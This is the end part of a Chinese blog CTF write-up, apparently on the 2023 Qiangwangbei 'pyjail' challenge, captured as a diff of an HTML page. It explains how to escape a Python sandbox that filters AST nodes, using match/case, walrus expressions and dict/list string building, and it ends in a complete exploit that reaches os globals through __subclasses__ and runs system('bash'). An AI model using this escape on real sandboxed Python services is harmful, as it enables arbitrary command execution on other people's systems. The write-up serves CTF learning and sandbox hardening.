+    <span class="nf">case </span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">y</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">z</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">case </span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">y</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+    <span class="nf">case </span><span class="p">(</span><span class="n">x</span><span class="p">,):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>对于基本类型的匹配比较好理解，下面是一个匹配类的示例：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">AClass</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+        <span class="n">self</span><span class="p">.</span><span class="n">thing</span> <span class="o">=</span> <span class="n">value</span>
+
+<span class="n">item</span> <span class="o">=</span> <span class="nc">AClass</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>
+
+<span class="n">match</span> <span class="n">item</span><span class="p">:</span>
+    <span class="n">case</span> <span class="nc">AClass</span><span class="p">(</span><span class="n">thing</span><span class="o">=</span><span class="n">x</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Got </span><span class="si">{</span><span class="n">x</span> <span class="o">=</span> <span class="si">}</span><span class="s">!</span><span class="sh">"</span><span class="p">)</span>
+
+<span class="c1"># Got x = 32!
+</span></code></pre></div></div>
+<p>在这个示例中，重点关注<code class="language-plaintext highlighter-rouge">case AClass(thing=x)</code>，这里的含义并非是将 x 赋值给 thing，我们需要将其理解为一个表达式，表示匹配类型为 AClass 且存在 thing 属性的对象，并且 thing 属性值自动赋值给 x。</p>
+
+<p>这样一来就可以在不适用 . 号的情况下获取到类的属性值。例如获取 <code class="language-plaintext highlighter-rouge">''.__class__</code>，我们可以编写如下的 match/case 语句：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nf">str</span><span class="p">():</span>
+    <span class="n">case</span> <span class="nf">str</span><span class="p">(</span><span class="n">__class__</span><span class="o">=</span><span class="n">x</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="o">==</span><span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">)</span>
+
+<span class="c1"># True
+</span></code></pre></div></div>
+<p>可以看到 x 就是 <code class="language-plaintext highlighter-rouge">''.__class__</code>. 因为所有的类都输入 object 类，所以我们可以使用 object 来替代 str，这样就无需关注匹配到的到底是哪个类。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nf">str</span><span class="p">():</span>
+    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__class__</span><span class="o">=</span><span class="n">x</span><span class="p">):</span>
+        <span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="o">==</span><span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">)</span>
+
+<span class="c1"># True
+</span></code></pre></div></div>
+
+<p>再测试一下该 payload 的 AST：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
+<span class="kn">import</span> <span class="n">ast</span> 
+
+<span class="n">a</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
+match str():
+    case str(__class__=x):
+        print(x)
+</span><span class="sh">'''</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">ast</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="n">ast</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="sh">'</span><span class="s">exec</span><span class="sh">'</span><span class="p">),</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span>
+</code></pre></div></div>
+<p>AST 如下：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Module</span><span class="p">(</span>
+    <span class="n">body</span><span class="o">=</span><span class="p">[</span>
+        <span class="nc">Match</span><span class="p">(</span>
+            <span class="n">subject</span><span class="o">=</span><span class="nc">Call</span><span class="p">(</span>
+                <span class="n">func</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">str</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()),</span>
+                <span class="n">args</span><span class="o">=</span><span class="p">[],</span>
+                <span class="n">keywords</span><span class="o">=</span><span class="p">[]),</span>
+            <span class="n">cases</span><span class="o">=</span><span class="p">[</span>
+                <span class="nf">match_case</span><span class="p">(</span>
+                    <span class="n">pattern</span><span class="o">=</span><span class="nc">MatchClass</span><span class="p">(</span>
+                        <span class="n">cls</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">str</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()),</span>
+                        <span class="n">patterns</span><span class="o">=</span><span class="p">[],</span>
+                        <span class="n">kwd_attrs</span><span class="o">=</span><span class="p">[</span>
+                            <span class="sh">'</span><span class="s">__class__</span><span class="sh">'</span><span class="p">],</span>
+                        <span class="n">kwd_patterns</span><span class="o">=</span><span class="p">[</span>
+                            <span class="nc">MatchAs</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">)]),</span>
+                    <span class="n">body</span><span class="o">=</span><span class="p">[</span>
+                        <span class="nc">Expr</span><span class="p">(</span>
+                            <span class="n">value</span><span class="o">=</span><span class="nc">Call</span><span class="p">(</span>
+                                <span class="n">func</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">print</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()),</span>
+                                <span class="n">args</span><span class="o">=</span><span class="p">[</span>
+                                    <span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">())],</span>
+                                <span class="n">keywords</span><span class="o">=</span><span class="p">[]))])])],</span>
+    <span class="n">type_ignores</span><span class="o">=</span><span class="p">[])</span>
+</code></pre></div></div>
+<p>可以看到确实没有 Attribute，依据这个原理，就可以绕过 ast.Attribute</p>
+
+<p>我们可以构造替代 <code class="language-plaintext highlighter-rouge">''.__class__.__base__.__subclasses__()</code>的 payload：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nf">str</span><span class="p">():</span>
+    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__class__</span><span class="o">=</span><span class="n">clazz</span><span class="p">):</span>
+        <span class="n">match</span> <span class="n">clazz</span><span class="p">:</span>
+            <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__base__</span><span class="o">=</span><span class="n">bass</span><span class="p">):</span>
+                <span class="n">match</span> <span class="n">bass</span><span class="p">:</span>
+                    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__subclasses__</span><span class="o">=</span><span class="n">subclazz</span><span class="p">):</span>
+                        <span class="nf">print</span><span class="p">(</span><span class="n">subclazz</span><span class="p">)</span>
+</code></pre></div></div>
+<h3 id="绕过-astassign-赋值变量">绕过 ast.Assign 赋值变量</h3>
+<p>ast.Assign 无法使用时，我们无法直接使用 = 来进行赋值，此时可以使用海象表达式进行绕过。例如：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span>
+    <span class="n">system</span><span class="p">:</span><span class="o">=</span><span class="mi">111</span><span class="p">,</span>
+    <span class="n">bash</span><span class="p">:</span><span class="o">=</span><span class="mi">222</span>
+<span class="p">]</span>
+</code></pre></div></div>
+<p>此时 AST 树如下,海象表达式用到的是 ast.NamedExpr 而非 ast.Assign</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Module</span><span class="p">(</span>
+    <span class="n">body</span><span class="o">=</span><span class="p">[</span>
+        <span class="nc">Expr</span><span class="p">(</span>
+            <span class="n">value</span><span class="o">=</span><span class="nc">List</span><span class="p">(</span>
+                <span class="n">elts</span><span class="o">=</span><span class="p">[</span>
+                    <span class="nc">NamedExpr</span><span class="p">(</span>
+                        <span class="n">target</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Store</span><span class="p">()),</span>
+                        <span class="n">value</span><span class="o">=</span><span class="nc">Constant</span><span class="p">(</span><span class="n">value</span><span class="o">=</span><span class="mi">111</span><span class="p">)),</span>
+                    <span class="nc">NamedExpr</span><span class="p">(</span>
+                        <span class="n">target</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">bash</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Store</span><span class="p">()),</span>
+                        <span class="n">value</span><span class="o">=</span><span class="nc">Constant</span><span class="p">(</span><span class="n">value</span><span class="o">=</span><span class="mi">222</span><span class="p">))],</span>
+                <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()))],</span>
+    <span class="n">type_ignores</span><span class="o">=</span><span class="p">[])</span>
+</code></pre></div></div>
+
+<h3 id="绕过-astconstant-获取数字字符串">绕过 ast.Constant 获取数字、字符串</h3>
+<p>题目限制了 ast.Constant，所以我们无法直接使用数字、字符串常量，但通过其他的函数组合我们可以构造出数字和字符串。
+例如：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">""</span> <span class="p">:</span> <span class="nf">str</span><span class="p">()</span>
+<span class="mi">0</span>  <span class="p">:</span> <span class="nf">len</span><span class="p">([])</span>
+<span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([]))</span>
+<span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nf">str</span><span class="p">()]))</span> <span class="n">或</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">]))</span>
+<span class="sh">"</span><span class="s">2</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nf">str</span><span class="p">(),</span><span class="nf">str</span><span class="p">()]))</span> <span class="n">或</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">,</span><span class="nb">max</span><span class="p">]))</span>
+<span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">:</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">])</span><span class="o">*</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">]))</span>
+</code></pre></div></div>
+<p>如果要用数字来构造字符串，通常需要用到 chr 函数，虽然题目的 builtins 没有直接提供 chr 函数，但我们也可以自己手动实现一个 chr。</p>
+
+<p>当然，题目 builtins 允许 dict 和 list，我们可以直接用这两个函数直接构造出字符串，这种方式在我此前的博客：<a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-02-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2%E7%BB%95%E8%BF%87.html#list--dict">pyjail bypass-02 绕过基于字符串匹配的过滤</a> 中有提到过。</p>
+
+<p>在这个 payload 中，我们需要构造出 _wrap_close、system、bash</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span> <span class="n">x</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">_wrap_close</span><span class="sh">"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">](</span><span class="sh">"</span><span class="s">bash</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>那么我们就可以通过下面的方式获取到这几个字符串：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>list<span class="o">(</span>dict<span class="o">(</span><span class="nv">system</span><span class="o">=[]))[</span>0]            <span class="c"># system</span>
+list<span class="o">(</span>dict<span class="o">(</span><span class="nv">_wrap_close</span><span class="o">=[]))[</span>0]       <span class="c"># _wrap_close</span>
+list<span class="o">(</span>dict<span class="o">(</span><span class="nv">bash</span><span class="o">=[]))[</span>0]              <span class="c"># bash</span>
+</code></pre></div></div>
+
+<h3 id="绕过-astsubscript-获取列表字典元素">绕过 ast.Subscript 获取列表/字典元素</h3>
+<p>题目同时限定了 ast.Subscript，我们无法直接使用索引。但 BUILTINS 中给出了 min 函数，该函数可以获取列表中最小的元素，当列表中只有一个元素时，就可以直接取值。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">system</span><span class="o">=</span><span class="p">[])))</span>            <span class="c1"># system
+</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">_wrap_close</span><span class="o">=</span><span class="p">[])))</span>       <span class="c1"># _wrap_close
+</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">bash</span><span class="o">=</span><span class="p">[])))</span>              <span class="c1"># bash
+</span></code></pre></div></div>
+
+<p>如果要获取字典元素，可以利用 get 函数来替代 Subscript。例如我需要在 globals 字典中获取 key 为 system 的元素，可以配合 match/case 来获取。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nb">globals</span><span class="p">:</span>
+    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">get</span><span class="o">=</span><span class="n">get_func</span><span class="p">):</span>
+        <span class="nf">get_func</span><span class="p">(</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="绕过-astfor-遍历列表">绕过 ast.For 遍历列表</h3>
+<p>在构造最终 payload 中，我们还需要在 <code class="language-plaintext highlighter-rouge">__subclasses__()</code>得到的列表中获取到 _wrap_close 类。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span> <span class="n">x</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">_wrap_close</span><span class="sh">"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">](</span><span class="sh">"</span><span class="s">bash</span><span class="sh">"</span><span class="p">)</span>
+</code></pre></div></div>
+<p>当列表中不只有一个元素且列表中的元素之间无法比较时，正常情况下可以使用 for 来遍历并判断，但 ast.For 被题目过滤了，此时我们可以使用 filter，如下所示：</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">filter_func</span><span class="p">(</span><span class="n">subclazzes_item</span><span class="p">):</span>
+    <span class="p">[</span> <span class="n">_wrap_close</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">_wrap_close</span><span class="o">=</span><span class="p">[])))]</span>
+    <span class="n">match</span> <span class="n">subclazzes_item</span><span class="p">:</span>
+        <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">name_</span><span class="err">＿</span><span class="o">=</span><span class="n">name</span><span class="p">):</span>
+            <span class="k">if</span> <span class="n">name</span><span class="o">==</span><span class="n">_wrap_close</span><span class="p">:</span>
+                <span class="k">return</span> <span class="n">subclazzes_item</span>
+<span class="p">[</span>
+    <span class="n">subclazzes_item</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="n">filter_func</span><span class="p">,</span><span class="nf">subclazzes</span><span class="p">()))</span>
+<span class="p">]</span>
+</code></pre></div></div>
+<p>fitler 中使用 match/case 和 if 来进行过滤。</p>
+
+<p>除了使用 filter 函数外，还可以使用 iter 和 next 函数来遍历列表，但题目 BUILTINS 中没有给出这两个函数。</p>
+
+<h3 id="exp">EXP</h3>
+<p>整合了所有的绕过手段，其实就可以编写出 payload 了。</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nf">str</span><span class="p">():</span>
+    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">class_</span><span class="err">＿</span><span class="o">=</span><span class="n">clazz</span><span class="p">):</span>
+        <span class="n">match</span> <span class="n">clazz</span><span class="p">:</span>
+            <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">base_</span><span class="err">＿</span><span class="o">=</span><span class="n">bass</span><span class="p">):</span>
+                <span class="n">match</span> <span class="n">bass</span><span class="p">:</span>
+                    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">subclasses_</span><span class="err">＿</span><span class="o">=</span><span class="n">subclazzes</span><span class="p">):</span>
+                        <span class="p">[</span>
+                            <span class="n">system</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">system</span><span class="o">=</span><span class="p">[]))),</span>
+                            <span class="n">bash</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">bash</span><span class="o">=</span><span class="p">[])))</span>
+                        <span class="p">]</span>
+                        <span class="k">def</span> <span class="nf">filter_func</span><span class="p">(</span><span class="n">subclazzes_item</span><span class="p">):</span>
+                            <span class="p">[</span> <span class="n">_wrap_close</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">_wrap_close</span><span class="o">=</span><span class="p">[])))]</span>
+                            <span class="n">match</span> <span class="n">subclazzes_item</span><span class="p">:</span>
+                                <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">name_</span><span class="err">＿</span><span class="o">=</span><span class="n">name</span><span class="p">):</span>
+                                    <span class="k">if</span> <span class="n">name</span><span class="o">==</span><span class="n">_wrap_close</span><span class="p">:</span>
+                                        <span class="k">return</span> <span class="n">subclazzes_item</span>
+                        <span class="p">[</span>
+                            <span class="n">subclazzes_item</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="n">filter_func</span><span class="p">,</span><span class="nf">subclazzes</span><span class="p">()))</span>
+                        <span class="p">]</span>
+                        <span class="n">match</span> <span class="n">subclazzes_item</span><span class="p">:</span>
+                            <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">init_</span><span class="err">＿</span><span class="o">=</span><span class="n">initz</span><span class="p">):</span>
+                                <span class="n">match</span> <span class="n">initz</span><span class="p">:</span>
+                                    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">＿</span><span class="n">globals_</span><span class="err">＿</span><span class="o">=</span><span class="nb">globals</span><span class="p">):</span>
+                                        <span class="n">match</span> <span class="nb">globals</span><span class="p">:</span>
+                                            <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">get</span><span class="o">=</span><span class="n">get_func</span><span class="p">):</span>
+                                                <span class="nf">get_func</span><span class="p">(</span><span class="n">system</span><span class="p">)(</span><span class="n">bash</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>新学到的一些绕过手法也会同步更新到 pyjail 系列博客😊。</p>
+
+<h1 id="参考">参考</h1>
+<ul>
+  <li><a href="https://boogipop.com/2023/12/18/%E7%AC%AC%E4%B8%83%E5%B1%8A%20%E5%BC%BA%E7%BD%91%E6%9D%AF%20%E5%85%A8%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B%20Web%20Writeup/#easyphp">第七届 强网杯 全国网络安全挑战赛 Web Writeup - Boogiepop Doesn’t Laugh</a></li>
+  <li><a href="https://hurrison.com/posts/qwb2023/#pyjail--its-myast-">强网杯 2023 线上赛部分 Writeup - Hurrison’s Blog</a></li>
+  <li><a href="https://henryiii.github.io/level-up-your-python/notebooks/2.8%20Pattern%20Matching.html">13. Structural Pattern Matching (Python 3.10+) — Level Up Your Python</a></li>
+</ul>
+</div><section class="article__sharing d-print-none"></section><div class="d-print-none"><footer class="article__footer"><meta itemprop="dateModified" content="2023-12-19T18:29:48+08:00"><!-- start custom article footer snippet -->
+
+<!-- end custom article footer snippet -->
+<div class="article__subscribe"><div class="subscribe"><i class="fas fa-rss"></i> <a type="application/rss+xml" href="/feed.xml">Subscribe</a></div>
+</div><div class="article__license"><div class="license">
+    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
+      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
+        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
+      </a>
+    </p>
+  </div></div></footer>
+<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/css/2023/12/12/CSS-injection.html">前端安全：CSS 注入</a></div></div></div>
+
+</div>
+
+<script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    $(function() {
+      var $this ,$scroll;
+      var $articleContent = $('.js-article-content');
+      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
+      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
+      $scroll = $(scroll);
+
+      $articleContent.find('.highlight').each(function() {
+        $this = $(this);
+        $this.attr('data-lang', $this.find('code').attr('data-lang'));
+      });
+      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
+        $this = $(this);
+        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
+      });
+      $articleContent.on('click', '.anchor', function() {
+        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
+      });
+    });
+  });
+})();
+</script>
+</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->
+
+<!-- end custom main bottom snippet -->
+</div>
+            </div></div></div><div class="page__footer d-print-none">
+<footer class="footer py-4 js-page-footer">
+  <div class="main"><div itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="DumKiy"><meta itemprop="url" content="/"><meta itemprop="description" content="Watch And Learn."><div class="footer__author-links"><div class="author-links">
+  <ul class="menu menu--nowrap menu--inline"><li title="Follow me on Github.">
+        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/DummyKitty" target="_blank">
+          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
+</svg>
+</div>
+        </a>
+      </li></ul>
+</div>
+</div>
+    </div><div class="site-info mt-2">
+      <div>© DumKiy's blog 2021,
+        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
+        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
+      </div>
+    </div>
+  </div>
+</footer>
+</div></div>
+    </div><script>(function() {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    var $body = $('body'), $window = $(window);
+    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
+    var activeCount = 0;
+    function modal(options) {
+      var $root = this, visible, onChange, hideWhenWindowScroll = false;
+      var scrollTop;
+      function setOptions(options) {
+        var _options = options || {};
+        visible = _options.initialVisible === undefined ? false : show;
+        onChange = _options.onChange;
+        hideWhenWindowScroll = _options.hideWhenWindowScroll;
+      }
+      function init() {
+        setState(visible);
+      }
+      function setState(isShow) {
+        if (isShow === visible) {
+          return;
+        }
+        visible = isShow;
+        if (visible) {
+          activeCount++;
+          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
+          $root.addClass('modal--show');
+          $pageMain.scrollTop(scrollTop);
+          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
+          $window.on('keyup', handleKeyup);
+        } else {
+          activeCount > 0 && activeCount--;
+          $root.removeClass('modal--show');
+          $window.scrollTop(scrollTop);
+          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
+          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
+          $window.off('keyup', handleKeyup);
+        }
+        onChange && onChange(visible);
+      }
+      function show() {
+        setState(true);
+      }
+      function hide() {
+        setState(false);
+      }
+      function handleKeyup(e) {
+        // Char Code: 27  ESC
+        if (e.which ===  27) {
+          hide();
+        }
+      }
+      setOptions(options);
+      init();
+      return {
+        show: show,
+        hide: hide,
+        $el: $root
+      };
+    }
+    $.fn.modal = modal;
+  });
+})();
+</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
+(function () {
+  var SOURCES = window.TEXT_VARIABLES.sources;
+  window.Lazyload.js(SOURCES.jquery, function() {
+    // search panel
+    var search = (window.search || (window.search = {}));
+    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
+      true : window.useDefaultSearchBox ;
+
